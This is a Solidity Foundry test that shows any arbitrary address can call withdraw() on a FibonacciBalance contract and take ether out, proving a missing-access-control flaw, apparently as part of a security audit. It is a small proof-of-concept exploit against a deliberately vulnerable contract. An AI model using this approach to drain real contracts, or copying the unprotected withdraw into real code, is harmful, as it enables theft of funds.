
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {FibonacciBalance, FibonacciLib} from "../src/FibonacciBalance.sol";

contract TestAccessControlFibonacciBalance is Test {
    FibonacciBalance public _contractUnderTest;
    FibonacciLib public _fibonacciLib;

    function setUp() public {
        // Deploy the FibonacciLib first
        _fibonacciLib = new FibonacciLib();
        
        // Fund this contract to deploy FibonacciBalance with ether
        vm.deal(address(this), 100 ether);
        
        // Deploy FibonacciBalance with the library address and initial funds
        _contractUnderTest = new FibonacciBalance{value: 100 ether}(address(_fibonacciLib));
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));

        // Exclude Foundry Internals (Dynamic)
        vm.assume(caller != address(vm)); 
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // The withdraw function has NO access control - there is no owner or privileged role to exclude
        // This is the vulnerability: anyone can call withdraw and drain funds

        // --- 2. State Configuration ---
        
        // Fund the caller so they can receive the transfer
        vm.deal(caller, 0);
        
        // Record the initial state
        uint256 initialContractBalance = address(_contractUnderTest).balance;
        uint256 initialCallerBalance = caller.balance;
        uint256 initialWithdrawalCounter = _contractUnderTest.withdrawalCounter();

        // --- 3. Execution & Assertion ---
        
        // Switch context to the arbitrary caller
        vm.prank(caller);

        // Call the withdraw function - this should succeed for ANY caller (vulnerability)
        _contractUnderTest.withdraw();

        // Assert that the withdrawal actually happened
        // The withdrawal counter should have increased
        assertEq(_contractUnderTest.withdrawalCounter(), initialWithdrawalCounter + 1, "Withdrawal counter should increment");
        
        // The caller should have received ether (fibonacci of 1 = start + 1 = 3 + 1 = 4 ether for first withdrawal)
        uint256 expectedFibNumber = 4; // fibonacci(1) with start=3 returns start + 1 = 4
        assertEq(caller.balance, initialCallerBalance + expectedFibNumber * 1 ether, "Caller should receive fibonacci amount");
        
        // Contract balance should have decreased
        assertEq(address(_contractUnderTest).balance, initialContractBalance - expectedFibNumber * 1 ether, "Contract balance should decrease");
    }
}
